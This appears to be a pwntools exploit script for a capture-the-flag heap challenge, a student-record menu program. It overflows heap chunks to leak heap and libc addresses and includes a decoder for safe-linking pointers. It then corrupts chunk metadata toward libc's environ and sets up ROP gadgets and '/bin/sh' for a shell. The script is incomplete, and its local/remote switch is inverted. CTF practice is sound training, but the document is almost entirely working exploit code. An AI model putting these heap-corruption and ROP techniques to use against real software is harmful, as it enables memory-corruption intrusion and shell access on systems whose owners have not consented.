#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = remote("addr", 1337)
        
    else:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)

    return r

r = conn()
input()
def addSV(nameSize, name):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'Size name: ', str(nameSize).encode())
    r.sendafter(b'Name: ', name)
    r.sendlineafter(b'Age: ', b'1')
    r.sendlineafter(b'Score: ', b'1')
def showSV():
    r.sendlineafter(b'> ', b'2')
def deleteSV(index):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'Index: ', str(index).encode())
def decrypt(cipher):
    key = 0
    plain = 0
    for i in range(6):
        bits = 64 - 12*i
        if bits < 0: 
            bits = 0
        plain = ((cipher ^ key) >> bits ) << bits 
        key = plain >> 12 
    return plain
# 1. Leak heap

addSV(16, b'A')
addSV(10, b'A')
# pause()
deleteSV(0)
addSV(16, b'A'*24 + b'\x21' + b'A'*8)
# pause()
showSV()
r.recvuntil(b'AAAAAAAAAAAAAAAAAAAAAAAA!AAAAAAA')
heap_leak = u32(r.recv(4))
info("Heap leak: " + hex(heap_leak))
# 2. Leak libc
addSV(16, b'A')
addSV(0x700, b'A')
addSV(8, b'A')
# pause()
deleteSV(3)
deleteSV(2)
pause()
# addSV(16, b'C'*24 + b'\x21' + b'C'*16 + p32(heap_leak + 0x74f) + b'C'*4 + b'\x11\x07' + b'C'*6 )
addSV(16, b'C'*56 + b'\x11\x07' + b'C'*6)
showSV()
r.recvuntil(b'\x11\x07CCCCCC')
libc_leak = u64(r.recv(6)+b'\0\0')
info('Libc leak: ' + hex(libc_leak))
libc.address = libc_leak - 0x21ace0
info('Libc base: ' + hex(libc.address))
# pause()
deleteSV(2)
deleteSV(2)
addSV(16, p64(libc.sym['environ'] - 1) + p64(0) * 2 + p64(0x21) + p64(0)*2 + p64(0x21) + p64(0x711))
pop_rdi = libc.address + 0x000000000002a3e5
binsh = next(libc.search('/bin/sh'))
ret = libc.address + 0x29cd6
# showSV()
# good luck pwning :)

r.interactive()


